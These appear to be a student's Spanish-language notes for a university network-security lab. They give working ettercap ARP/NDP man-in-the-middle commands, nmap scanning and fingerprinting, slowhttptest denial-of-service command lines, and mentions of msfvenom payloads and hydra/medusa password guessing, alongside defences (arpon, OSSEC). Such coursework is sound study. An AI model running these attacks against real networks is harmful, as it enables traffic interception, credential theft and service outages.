# A)
Install ettercap
```bash
apt install ettercap-text-only
```
Funcionamiento:
```bash
ettercap [options][target1][target2]

ejemplo:
ettercap /10.11.48.56//
```
Con ettercap realizaremos ARP spoofing
# B)
Comando básico para realizar spoofing:
```bash
ettercap -T -q -i ens33 -M arp:remote //10.11.48.142/ //10.11.48.1/ -w bisbi.pcap
```
- -T, text mode
- -q, filtra lo que se muestra por pantalla.
- -i, establece la interfaz a usar.
- -M, man in de midel.
	- arp:remote, uso del MITM arp en remoto.
		- target
		- gateway

Envió de los archivos:
```shell
//en otra maquina
scp lsi@10.11.48.143:/home/lsi/bisbi.pcap
```
Abrimos en wireshark buscamos el png y en File -> Export object lo guardamos y luego abrimos.
# C)
Para obtener la mac del segmento usamos:
```
nmap -sP 10.11.48.0/23
```
- -sP, host discovery sobre un segmento mediante syng, ack y cmp 

respuestas con formato:
```
Nmap scan report for 10.11.49.17
Host is up (0.00040s latency).
MAC Address: 00:50:56:97:F6:06 (VMware)
```
# D)x
Para obtener las ipv6 usamos:
```
ping6 -c 2 -I ens33 2002:a0b::1
ip -6 neigh
```
// todo lo de ipv6 sin fe....
# E) 
Para obtener nuestro trafico tcp:
```shell
//tomamos el trafico tcp
tcpdump -i ens33 -s 65535 -w my.pcap
//recuperamos para usar wireshark
scp lsi@10.11.48.143:/home/lsi/my.pcap .
```
Usamos wireshark para analizar.
# F) 
Editar en ettercap el valor de remote browser:
```
// /etc/etter.conf
remote_browser = w3m .....
```
Lanzamiento del spofing sobre la máquina con el remote.
```shell
ettercap -T -i ens33 -P remote_browser -q -M arp:remote //10.11.48.142/ //10.11.48.1/
```
# G)x B
Generación de peiloads y envió al atacado, la segunda parte es ingeniería social para que parezca natural.
Para creación:
- metasploit + msfvenom (neterpreter/shell/bash)
Social:
- filto ettercap
- ingeniería social

# H)x B
MITM ipv6 ettercap + ndp
```
ettercap -T -i 6to4 -Q -M ndp:remote //2002:a0b:308e::1/ //2002:a0b:308e::1/

??ettercap -T -i ens33 -Q -M arp:remote //2002:a0b:308e::1/ //::10.11.48.1/
```
# I)
arpon(defensa) vs ettercap + arp poisoning(ataque)
- registros del ataque
- mostrar que el arp se mantiene

cong in /etc/arpon.conf
logs in /var/log/arpon.log.1

Ver el arp:
```
arp
```
Flush arp:
```
ip -s -s neigh flush all
```
Activate arpON:
```
arpon -d -i ens33 -S
```
# J)
- discobery
	- nmap -sP 10.11.48.0/23
- port scaning
	- nmap -sS 10.11.48.142
- fingerprintimg
	- nmap -O 10.11.48.142
- ipv6
	- namp -sS -6 2002:a0b:308f::1
# K)
conexiones y ancho de banda consumido
- iftop
- tcptrack
- nethogs

```shell
iftop -i ens33
--
tcptrack -i ens33
--
nethogs
```
# L)x B
Monitoreo infraestructura.

| servicio      | versión | puerto |
| ------------- | ------- | ------ |
| Prometeus     | 2.47    | 9000   |
| Node_explorer | -       | 9010   | 
| Grafana       | 10.2.0  | 3000   |

Grafana:
- dashbord 1860

//Prestar atención a como se generan los servicios en los tutoriales.
# M)
Los Dos directos se basan en esclavizar equipos para inundar de peticiones directas a un servicio, por otra parte, el reflexivo se centra en enviar peticiones a servidores de alta capacidad con origen el destino para inundarlo de las replays.
Para realizar estos ataques con packit utilizaríamos su modo de inyección, para el directo (DDOS) enviando al objetivo directamente, por otra parte, el reflexivo (DrDDOS) se realiza mediante la misma inyección, pero como objetivo reflectores e ip falsa objetivo para que reciba las repuestas.
# N)
Ataque ddos basado en el envío de cabeceras incompletas para reservar recursos en el servidor a la espera del resto del mensaje (sloworis).
```shell
//cabeceras incompletas
slowhttptest -c 1000 -H -g -o slowhttp -i 10 -r 200 -t GET -u http://10.11.48.142 -x 24 -p 3

//post body
slowhttptest -c 1000 -B -g -o slowhttp -i 110 -r 200 -s 8192 -t FAKEVERB -u https://10.11.48.142 -x 10 -p 3

//lectura lenta
slowhttptest -c 1000 -X -g -o slow_read_stats -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u https://10.11.48.142 -p 3

//memoria (apache)
slowhttptest -R -u http://10.11.48.142 -t HEAD -c 1000 -a 10 -b 3000 -r 500
```
Para proteger contra este tipo de ataque en el mismo segmento, un firewall que detectara y filtrara el tráfico sospechoso, gran cantidad de peticiones saliendo de un mismo equipo con cabeceras incompletas y distintas direcciones. Para reducir el impacto de este tipo de ataques cuando provienen de fuera del segmento sería las restricciones del servicio para velocidades de descarga bajas y tiempos máximos de conexión.
Para evitar estas protecciones en el caso del firewall 
# O)x B
defender apache
- modsecurity (dentro de apache)
- modevaise -0,25 (NO USAR)

# P)x B
Averiguar de la usc
- server dns/transferencia de zona
- gestores de contenido
- servidor de correo/estafetas

# Q)x K
Trate de sacar un perfil de los principales sistemas que conviven en su red de prácticas, 
puertos accesibles, fingerprinting, et
```shell
root@debian:/home/lsi# nmap -A 10.11.48.1
Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-09 04:57 CET
Nmap scan report for 10.11.48.1
Host is up (0.0017s latency).
All 1000 scanned ports on 10.11.48.1 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)
MAC Address: DC:08:56:10:84:B9 (Alcatel-Lucent Enterprise)
Too many fingerprints match this host to give specific OS details
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   1.71 ms 10.11.48.1

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.58 seconds
```
```shell

```
# R)x B
password guesing
- medusa
- hydra

Se necesita un fichero de users y uno de contraseñas:
- un usuario lsi.
- diez contraseñas siendo la ultima la correcta.

# S)
- Run
```shell
/var/ossec/bin/ossec-control start
```
- Desbanear
```shell
/var/ossec/active-response/bin/host-deny.sh delete - 10.11.48.142
/var/ossec/active-response/bin/firewall-drop.sh delete - 10.11.48.142
/var/ossec/bin/ossec-control restart
```
- Modify rules
Desactivamos el máximo de intentos de ssh básico, ignoramos las normas 5758 y 2502. Para seleccionar la cantidad que queremos, modificamos la 5720.
# T)
Para ver los logs de ossec necesitamos:
```shell
//logs
cat /var/log/auth.log | /var/ossec/bin/ossec-logtest -a
//reporte de los logs
cat /var/log/auth.log | /var/ossec/bin/ossec-logtest -a |/var/ossec/bin/ossec-reportd
```
Para desvanear una ip hay que buscar la entrada de la respuesta activa donde se ha vaneado y replicarla con un delete en vez de add, ejemplo:
```log
/var/ossec/active-response/bin/host-deny.sh delete - 10.11.50.142 1699433223.32626 5720
/var/ossec/active-response/bin/firewall-drop.sh delete - 10.11.50.142 1699433223.32626 5720
```

